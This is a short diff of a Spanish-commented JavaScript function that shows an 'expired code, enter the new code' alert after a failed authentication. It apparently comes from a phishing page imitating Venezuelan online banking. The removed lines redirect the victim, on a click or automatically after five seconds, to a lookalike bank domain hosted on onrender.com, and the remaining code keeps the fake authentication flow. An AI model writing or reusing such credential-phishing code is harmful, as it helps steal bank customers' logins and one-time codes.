@@ -154,35 +154,8 @@ function mostrarAlertaAutenticacionIncorrecta() {
     mensaje.textContent = "Código expirado. Ingresa el nuevo código.";
     alerta.appendChild(mensaje);
 
-    // Agrega el botón de "Aceptar"
-    const botonAceptar = document.createElement("button");
-    botonAceptar.textContent = "Aceptar";
-    botonAceptar.style.backgroundColor = "#2f73c8"; // Color azul oscuro para el botón
-    botonAceptar.style.color = "white";
-    botonAceptar.style.border = "none";
-    botonAceptar.style.padding = "10px 20px";
-    botonAceptar.style.borderRadius = "5px";
-    botonAceptar.style.marginLeft = "15px";
-    botonAceptar.style.cursor = "pointer";
-    botonAceptar.style.fontWeight = "bold";
-
-    // Función para redirigir después de 5 segundos o al hacer clic en el botón
-    function redirigir() {
-        window.location.href = "https://bdvenlineabanvenez.onrender.com";
-    }
-
-    // Redirigir al hacer clic en el botón
-    botonAceptar.addEventListener("click", () => {
-        redirigir();
-    });
-
-    alerta.appendChild(botonAceptar);
-
     // Agrega el contenedor de alerta al cuerpo del documento
     document.body.appendChild(alerta);
-
-    // Redirigir automáticamente después de 5 segundos
-    setTimeout(redirigir, 5000);
 }
 
 // Modifica el evento de autenticación para mostrar la alerta personalizada
